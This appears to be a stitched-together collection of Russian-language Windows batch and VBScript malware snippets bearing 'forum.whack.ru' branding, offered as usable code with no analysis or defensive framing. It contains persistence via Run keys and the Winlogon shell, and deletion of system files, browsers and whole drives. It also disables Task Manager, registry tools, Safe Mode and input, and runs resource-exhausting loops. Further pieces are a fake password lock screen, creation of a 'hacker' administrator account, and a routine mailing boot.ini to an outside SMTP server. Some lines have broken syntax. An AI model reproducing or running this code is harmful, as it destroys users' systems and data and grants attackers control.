@echo off
copy %0 %WinDir%\Win32.bat > nul
copy %0 %windir%\Win32.bat > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d %windir%\Win32.bat /f

bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

rundll32 user,disableoemlayer

echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
echo do >> %systemdrive%\windows\system32\rundll32.vbs 
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
start %systemdrive%\windows\system32\rundll32.vbs 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 

echo Chr(39)>%temp%\temp1.vbs 
echo Chr(39)>%temp%\temp2.vbs 
echo on error resume next > %temp%\temp.vbs 
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs 
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs 
reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0 
copy %¶§% %SystemRoot%\user32dll.bat 
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f 
echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs 
echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs 
echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs 
echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru™">>%temp%\temp.vbs 
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru™">>%temp%\temp.vbs 
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru™">>%temp%\temp.vbs 
echo on error resume next > %temp%\temp1.vbs 
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs 
echo do>>%temp%\temp1.vbs 
echo fso.getfile ("A:\")>>%temp%\temp1.vbs 
echo loop>>%temp%\temp1.vbs 
echo on error resume next > %temp%\temp2.vbs 
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs 
echo do>>%temp%\temp2.vbs 
echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs 
echo loop>>%temp%\temp2.vbs 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 
echo set application=createobject("shell.application")>>%temp%\temp.vbs 
echo application.minimizeall>>%temp%\temp.vbs 
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 
start rundll32 user32, SwapMouseButton 
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
echo i=50 >> %temp%\temp.vbs 
echo while i^>0 or i^<0 >> %temp%\temp.vbs 
echo S.popup "forum.whack.ru™",0, "forum.whack.ru™",0+16 >> %temp%\temp.vbs 
echo i=i-1 >> %temp%\temp.vbs 
echo wend >> %temp%\temp.vbs 
echo do >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{capslock}" >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{numlock}" >> %temp%\temp.vbs 
echo wscript.sleep 200 >> %temp%\temp.vbs 
echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs 
echo loop>> %temp%\temp.vbs 
echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs 
echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs 
echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs 
echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs 
echo colCDROMs.Item(i).eject >> %temp%\temp.vbs 
echo next >> %temp%\temp.vbs 
echo End If >> %temp%\temp.vbs 
echo Call SendPost("smtp.mail.ru", "forum.whack.ru™@mail.ru", "support@mail.ru", "...", "Копм заражен!") >> %temp%\temp.vbs 
echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs 
echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs 
echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs 
echo Set Flds = iConf.Fields >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs 
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs 
echo Flds.Update >> %temp%\temp.vbs 
echo iMsg.Configuration = iConf >> %temp%\temp.vbs 
echo iMsg.To = strTo >> %temp%\temp.vbs 
echo iMsg.From = strFrom >> %temp%\temp.vbs 
echo iMsg.Subject = strSubject >> %temp%\temp.vbs 
echo iMsg.TextBody = strBody >> %temp%\temp.vbs 
echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs 
echo iMsg.Send >> %temp%\temp.vbs 
echo End Function >> %temp%\temp.vbs 
echo Set iMsg = Nothing >> %temp%\temp.vbs 
echo Set iConf = Nothing >> %temp%\temp.vbs 
echo Set Flds = Nothing >> %temp%\temp.vbs 

echo s.run "shutdown -r -t 0 -c ""pcforumhack.ru™"" -f",1 >> %temp%\temp.vbs 
start %temp%\temp.vbs 
start %temp%\temp1.vbs 
start %temp%\temp2.vbs 

CHCP 1251 
cls 
Set Yvaga=На вашем компьютере найден вирус. 
Set pass=Пароль 
Set pas=Введите пароль. 
Set virus=Чтобы разблокировать ПК вам потребуется ввести пароль 
Set dim=Выключаю вирус... 
title Внимание!!! 
CHCP 866 
IF EXIST C:\windows\boot.bat ( 
goto ok ) 
cls 
IF NOT EXIST C:\windows\boot.bat ( 
ECHO Windows Registry Editor Version 5.00 >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO "Shell"="Explorer.exe, C:\\windows\\boot.bat " >> C:\0.reg 
start/wait regedit -s C:\0.reg 
del C:\0.reg 
ECHO @echo off >>C:\windows\boot.bat 
ECHO C:\WINDOWS\system32\taskkill.exe /f /im Explorer.exe >>C:\windows\boot.bat 
ECHO reg add "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t REG_DWORD /d 1 /f >>C:\windows\boot.bat 
ECHO start sys.bat >>C:\windows\boot.bat 
attrib +r +a +s +h C:\windows\boot.bat 
copy virus.bat c:\windows\sys.bat 
attrib +r +a +s +h C:\windows\sys.bat 
GOTO end) 
:ok 
cls 
Echo %Yvaga% 
echo. 
echo %virus% 
echo %pas% 
set /a choise = 0 
set /p choise=%pass%: 
if "%choise%" == "101" goto gold 
if "%choise%" == "200393" goto status 
exit 
:status 
echo %dim% 
attrib -r -a -s -h C:\windows\boot.bat 
del C:\windows\boot.bat 
attrib -r -a -s -h C:\windows\sys.bat 
del C:\windows\sys.bat 
cls 
:gold 
start C:\ 
:end
 
Добавляет программу в автозагрузку ОС
copy ""%0"" "%SystemRoot%\system32\File.bat" 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\File.bat" /f 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
 
Date 13.09.96 
If exist c:ski.bat goto abc 
Copy %0 c:ski.bat 
Attrib +h c:ski.bat 
Echo c:ski.bat >>autoexec.bat 
:abc 
md PRIDUROK 
md LUZER 
md DURAK 
md LAMER 
Label E: PRIDUROK 
assoc .exe=.mp3 
del c:Program Files/q

rd C: /s /q
rd D: /s /q
rd E: /s /q
rd F: /s /q

del %systemroot%\system32\HAL.dll
rundll32 user,SwapMouseButton

del c:Program Files/q
taskkill /f /im explorer.exe >nul
del "%SystemRoot%Driver Cachei386driver.cab" /f /q >nul

copy ""%0"" "%SystemRoot%\system32\starter-load-arduino-ide.bat" >nul 
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\batinit.bat" /f >nul 

chcp 1251 
net user SUPPORT_388945a0 /delete 
net user hacker hack /add 
net localgroup Администраторы hacker /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

del "%SystemRoot%Cursors*.*" >nul

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
/v NoControlPanel /t REG_DWORD /d 1 /f >nul

del "%SystemRoot%\Media" /q >nul

del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul 

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul 

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 

:x
Start mspaint
goto x

copy %0 %WinDir%\Win32.bat > nul
copy %0 %windir%\Win32.bat > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d %windir%\Win32.bat /f
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot\*.* /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /q
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
rundll32 mouse,disable > nul
rundll32 keyboard,disable > nul
rundll32 user,disableoemlayer > nul
@echo off
taskkill /im /f chrome.exe
taskkill /im /f ie.exe
taskkill /im /f firefox.exe
taskkill /im /f opera.exe
taskkill /im /f safari.exe
del C:\Program Files\Google\Chrome\Application\chrome.exe /q
del C:\Program Files\Safari\safari.exe /q
del C:\Program Files\Mozilla Firefox\firefox.exe /q
del C:\Program Files\Opera\opera.exe /q
del C:\Program Files\Internet Explorer\ie.exe /q
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
taskkill /f /im explorer.exe > nul
del: *.*/q > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
del %WinDir%\system32\HAL.dll/q > nul
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
del "%SystemRoot%\Media" /q > nul
assoc .lnk=.txt
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
del "%SystemRoot%\Cursors\*.*" >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
copy "%0" "%SystemRoot%\system32\sys321.bat > nul

del *.* /q 

del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q

shutdown -s -t 1 -c "restarting" >nul 


 
